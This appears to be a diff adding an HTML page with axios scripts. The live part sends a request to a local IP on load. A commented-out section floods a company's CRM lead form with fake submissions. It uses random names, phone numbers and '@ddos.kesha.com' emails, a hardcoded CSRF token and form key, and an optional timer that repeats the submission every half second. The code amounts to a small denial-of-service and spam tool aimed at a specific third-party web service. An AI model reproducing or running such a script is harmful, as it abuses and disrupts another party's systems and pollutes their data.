@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send POST Request</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <script>
+        async function myGetMethod () {
+            try {
+                const res = await axios.get('http://192.168.242.218:8080/', {
+                    headers: {
+                        "Content-Type": "application"
+                    }
+                }).then(() => {
+                    console.log("Üstünlikli ugradyldy");
+                });
+            } catch (err) {
+                alert(err.message)
+            }
+        }
+        myGetMethod()
+    </script>
+</body>
+<!-- </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send POST Request</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+</head>
+<body>
+    <script>
+        async function sendPostRequest() {
+            const formData = {
+                csrf_token_name: "c7faa957f1d007462269eab9cd102d03",
+                key: "84ee914d701ac32795b6bda8deacd7a3",
+                name: generateRandomString(),
+                email: generateRandomEmail(),
+                phonenumber: generateRandomPhoneNumber()
+            };
+
+            const dataToSend = {
+                url: formUrl,
+                ...formData
+            };
+
+            try {
+                await axios.post(apiUrl, {
+                    data: JSON.stringify(dataToSend)
+                }, {
+                    headers: {
+                        "Content-Type": "multipart/form-data"
+                    }
+                }).then(() => {
+                    console.log("Üstünlikli ugradyldy");
+                });
+            } catch (error) {
+                console.log("Ýalnyşlyk ýüze çykdy");
+                console.log(error);
+            }
+        }
+
+        function generateRandomString() {
+            return Math.random().toString(36).substring(7);
+        }
+
+        function generateRandomEmail() {
+            return generateRandomString() + "@ddos.kesha.com";
+        }
+
+        function generateRandomPhoneNumber() {
+            return Math.floor(Math.random() * 10000000000).toString();
+        }
+
+        const formUrl = "https://ofis.yonekey.com/forms/wtl/84ee914d701ac32795b6bda8deacd7a3";
+        const apiUrl = "https://yonekey.com/api/crm/custom";
+        // setInterval(sendPostRequest, 500);
+        sendPostRequest()
+    </script>
+</body>
+</html> -->
